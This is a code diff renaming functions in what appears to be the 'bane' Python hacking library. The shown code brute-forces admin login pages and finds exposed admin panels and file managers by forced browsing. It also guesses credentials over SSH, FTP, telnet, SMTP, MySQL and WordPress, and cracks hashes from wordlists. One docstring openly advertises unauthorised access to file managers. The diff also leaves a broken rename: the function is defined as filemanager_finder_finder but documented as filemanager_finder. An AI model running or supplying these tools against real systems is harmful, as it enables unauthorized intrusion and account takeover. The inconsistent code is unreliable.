@@ -54,7 +54,7 @@ def access(u,timeout=10,bypass=False,proxy=None):
 """
 
 
-def adminlogin(u,pl,user_agent=None,extra={},fresh=False,timeout=10,proxy=None):
+def admin_login(u,pl,user_agent=None,extra={},fresh=False,timeout=10,proxy=None):
  '''
    this function try to use the values you insert in the dictionary field "p" to make a POST request in the login page and check it the 
    credentials are correct or not by checking the response code.
@@ -68,7 +68,7 @@ def adminlogin(u,pl,user_agent=None,extra={},fresh=False,timeout=10,proxy=None):
    usage:
 
    >>>import bane
-   >>>a=bane.adminlogin('http://www.example.com/admin/login.php',{'user':'ala','pass':'ala'})
+   >>>a=bane.admin_login('http://www.example.com/admin/login.php',{'user':'ala','pass':'ala'})
    >>>if a==True:
    ... print 'logged in!!!'
  '''
@@ -102,7 +102,7 @@ def adminlogin(u,pl,user_agent=None,extra={},fresh=False,timeout=10,proxy=None):
  except:
   pass
  return False
-def adminbf(u,wl=[],fresh=False,logs=True,returning=False,proxy=None,proxies=None,timeout=10):
+def admin_brute_force(u,wl=[],fresh=False,logs=True,returning=False,proxy=None,proxies=None,timeout=10):
   '''
    bruteforce admin logins
   '''
@@ -150,7 +150,7 @@ def adminbf(u,wl=[],fresh=False,logs=True,returning=False,proxy=None,proxies=Non
       b=x.split(':')[1]
       if a not in pl:
        extra.update({a:b})
-    res=adminlogin(u,pl,fresh=fresh,extra=extra,timeout=timeout,proxy=proxy)
+    res=admin_login(u,pl,fresh=fresh,extra=extra,timeout=timeout,proxy=proxy)
     if res==True:
      if logs==True:
       print("[+]Found!!!")
@@ -163,12 +163,12 @@ def adminbf(u,wl=[],fresh=False,logs=True,returning=False,proxy=None,proxies=Non
       print("[-]Failed")
   if returning==True:
    return op
-def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None,proxies=None):
+def filemanager_finder_finder(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None,proxies=None):
  '''
    if you are lucky and smart enough, using google dorking you can gain an unauthorised access to private file managers and manipulate files
    (delete, upload, edit...) and exploit this weakness on the security of the target for further purposes.
-   this funtion try to gain access to any giving website's filemanager by bruteforcing the links (list called "filemanager") and trying to get
-   200 ok response directly without redirectes which indicates in most of the cases to an unprotected accessebleb filemanager.
+   this funtion try to gain access to any giving website's filemanager_finder by bruteforcing the links (list called "filemanager_finder") and trying to get
+   200 ok response directly without redirectes which indicates in most of the cases to an unprotected accessebleb filemanager_finder.
 
    the function takes the following arguments:
 
@@ -183,8 +183,8 @@ def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None,
 
    >>>import bane
    >>>url='http://www.example.com/'
-   >>>bane.filemanager(url)
-   >>>bane.filemanager(url,returning=True,mapping=False)
+   >>>bane.filemanager_finder(url)
+   >>>bane.filemanager_finder(url,returning=True,mapping=False)
 '''
  k=[]
  for i in manager:
@@ -222,7 +222,7 @@ def filemanager(u,logs=True,mapping=False,returning=False,timeout=10,proxy=None,
    pass
  if returning==True:
   return k
-def forcebrowsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',proxy=None,proxies=None):
+def force_browsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',proxy=None,proxies=None):
  '''
    this function is using "Forced Browsing" technique which is aim to access restricted areas without providing any credentials!!!
    it is used here to gain access to admin control panel by trying different possible combinations of links with the given URL.
@@ -236,7 +236,7 @@ def forcebrowsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',
    you have to delete 'login.php' and insert the rest of the link in the function like this:
    
    >>>import bane
-   >>>bane.forcebrowsing('http://www.example.com/admin/')
+   >>>bane.force_browsing('http://www.example.com/admin/')
 
    then the function will try to find possible accesseble links:
 
@@ -278,7 +278,7 @@ def forcebrowsing(u,timeout=10,logs=True,returning=False,mapping=True,ext='php',
  if returning==True:
   return l
 
-def adminpanel(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,proxy=None,proxies=None):
+def admin_panel_finder(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,proxy=None,proxies=None):
  '''
    this function use a list of possible admin panel links with different extensions: php, asp, aspx, js, /, cfm, cgi, brf and html.
    
@@ -287,9 +287,9 @@ def adminpanel(u,logs=True,mapping=False,returning=False,ext='php',timeout=10,pr
    usage:
 
   >>>import bane
-  >>>bane.adminpanel('http://www.example.com',ext='php',timeout=7)
+  >>>bane.admin_panel_finder('http://www.example.com',ext='php',timeout=7)
 
-  >>>bane.adminpanel('http://www.example.com',ext='aspx',timeout=5)
+  >>>bane.admin_panel_finder('http://www.example.com',ext='aspx',timeout=5)
  '''
  links=[]
  ext=ext.strip()
@@ -392,7 +392,7 @@ def telnet(u,username,password,p=23,prompt='$',timeout=5):
  except:
   pass
  return False
-def sshlin(u,username,password,p=22,timeout=7):
+def ssh_linux(u,username,password,p=22,timeout=7):
  p='ssh -o StrictHostKeyChecking=no -p {} {}@{}'.format(p,username,u)
  try:
   child = pexpect.spawn(p)
@@ -422,7 +422,7 @@ def sshlin(u,username,password,p=22,timeout=7):
  except Exception as e:
   pass
  return False
-def sshwin(ip,username,password,p=22,timeout=5):
+def ssh_win(ip,username,password,p=22,timeout=5):
  try:
   s = SSHClient()
   s.set_missing_host_key_policy(AutoAddPolicy())
@@ -435,7 +435,7 @@ def sshwin(ip,username,password,p=22,timeout=5):
  except Exception as e:
   pass
  return False
-def ftpanon(ip,timeout=5):
+def ftp_anon(ip,timeout=5):
   try:
     ftp = FTP(ip,timeout=timeout)
     ftp.login()
@@ -443,7 +443,7 @@ def ftpanon(ip,timeout=5):
   except Exception as e:
     pass
   return False
-def sshandro(u,username,password,timeout=5):
+def ssh_andro(u,username,password,timeout=5):
  l="sshpass -p {} ssh -o ConnectTimeout={} -o StrictHostKeyChecking=no {}@{} echo 1; exit".format(password,timeout,username,u)
  ssh = subprocess.Popen(l.split(),stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
  p= ssh.communicate()
@@ -471,43 +471,43 @@ def mysql(u,username='root',password=''):
  except Exception as e:
   pass
  return False
-def hydra(u,p=25,proto="ssh",wl=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
+def hydra(u,p=22,protocol="ssh",wl=[],logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False,proxy=None,proxies=None):
  '''
    this function is similar to hydra tool to bruteforce attacks on different ports.
 
-   proto: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.
+   protocol: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.
 '''
  o=''
- if proto=="ssh":
-  s=sshlin
+ if protocol=="ssh":
+  s=ssh_linux
   if (sys.platform == "win32") or( sys.platform == "win64"):
-   s=sshwin
+   s=ssh_win
   if termux==True:
-   s=sshandro
- if proto=="ftp":
+   s=ssh_andro
+ if protocol=="ftp":
   s=ftp
- if proto=="smtp":
+ if protocol=="smtp":
   s=smtp
- if proto=="mysql":
+ if protocol=="mysql":
   s=mysql
- if proto=="wp":
+ if protocol=="wp":
   s=wpadmin
  for x in wl:
   user=x.split(':')[0].strip()
   pwd=x.split(':')[1].strip()
   if logs==True:
    print("[*]Trying: {}:{}".format(user,pwd))
-  if (proto=="mysql"):
+  if (protocol=="mysql"):
    r=s(u,user,pwd)
-  elif (proto=="ftp"):
+  elif (protocol=="ftp"):
    r=s(u,user,pwd,timeout=timeout)
-  elif (proto=="wp"):
+  elif (protocol=="wp"):
    if proxy:
     proxy=proxy
    if proxies:
     proxy=random.choice(proxies)
    r=s(u,user,pwd,proxy=proxy,timeout=timeout)
-  elif (proto=="smtp"):
+  elif (protocol=="smtp"):
    r=s(u,p,user,pwd,ehlo=ehlo,helo=helo,ttls=ttls)
   else:
    r=s(u,user,pwd,timeout=timeout)
@@ -523,12 +523,12 @@ def hydra(u,p=25,proto="ssh",wl=[],logs=True,returning=False,mapping=False,timeo
     print("[-]Failed")
  if returning==True:
   return o
-def decrypt(u,wl=[],md5h=False,sha1h=False,sha256h=False,sha224h=False,sha384h=False,sha512h=False,base64h=False,caesarh=False,logs=True,returning=False):
+def decrypt(u,wl=[],md5_hash=True,sha1_hash=False,sha256_hash=False,sha224_hash=False,sha384_hash=False,sha512_hash=False,base64_hash=False,caesar_hash=False,logs=True,returning=False):
  if logs==True:
   print('[!]hash: '+u+'\nbruteforcing has started!!!\n')
  s=False
  for x in wl:
-  if md5h==True:
+  if md5_hash==True:
    if dmd5(x,u)==True:
     if logs==True:
      print("[+]Hash match found: "+x+" | Type: md5")
@@ -536,7 +536,7 @@ def decrypt(u,wl=[],md5h=False,sha1h=False,sha256h=False,sha224h=False,sha384h=F
      break
     if returning==True:
      return x
-  if sha1h==True:
+  if sha1_hash==True:
    if dsha1(x,u)==True:
     if logs==True:
      print("[+]Hash match found: "+x+" | Type: sha1")
@@ -544,7 +544,7 @@ def decrypt(u,wl=[],md5h=False,sha1h=False,sha256h=False,sha224h=False,sha384h=F
      break
     if returning==True:
      return x
-  if sha256h==True:
+  if sha256_hash==True:
    if dsha256(x,u)==True:
     if logs==True:
      print("[+]Hash match found: "+x+" | Type: sha256")
@@ -552,7 +552,7 @@ def decrypt(u,wl=[],md5h=False,sha1h=False,sha256h=False,sha224h=False,sha384h=F
      break
     if returning==True:
      return x
-  if sha224h==True:
+  if sha224_hash==True:
    if dsha224(x,u)==True:
     if logs==True:
      print("[+]Hash match found: "+x+" | Type: sha224")
@@ -560,7 +560,7 @@ def decrypt(u,wl=[],md5h=False,sha1h=False,sha256h=False,sha224h=False,sha384h=F
      break
     if returning==True:
      return x
-  if sha384h==True:
+  if sha384_hash==True:
    if dsha384(x,u)==True:
     if logs==True:
      print("[+]Hash match found: "+x+" | Type: sha384")
@@ -568,7 +568,7 @@ def decrypt(u,wl=[],md5h=False,sha1h=False,sha256h=False,sha224h=False,sha384h=F
      break
     if returning==True:
      return x
-  if sha512h==True:
+  if sha512_hash==True:
    if dsha512(x,u)==True:
     if logs==True:
      print("[+]Hash match found: "+x+" | Type: sha512")
@@ -576,7 +576,7 @@ def decrypt(u,wl=[],md5h=False,sha1h=False,sha256h=False,sha224h=False,sha384h=F
      break
     if returning==True:
      return x
-  if base64h==True:
+  if base64_hash==True:
    if base64decode(x)==u:
     if logs==True:
      print("[+]Hash match found: "+x+" | Type: base64")
@@ -584,7 +584,7 @@ def decrypt(u,wl=[],md5h=False,sha1h=False,sha256h=False,sha224h=False,sha384h=F
      break
     if returning==True:
      return x
-  if caesarh==True:
+  if caesar_hash==True:
    for i in range(1,27):
     if dcaesar(x,i)==u:
      if logs==True:
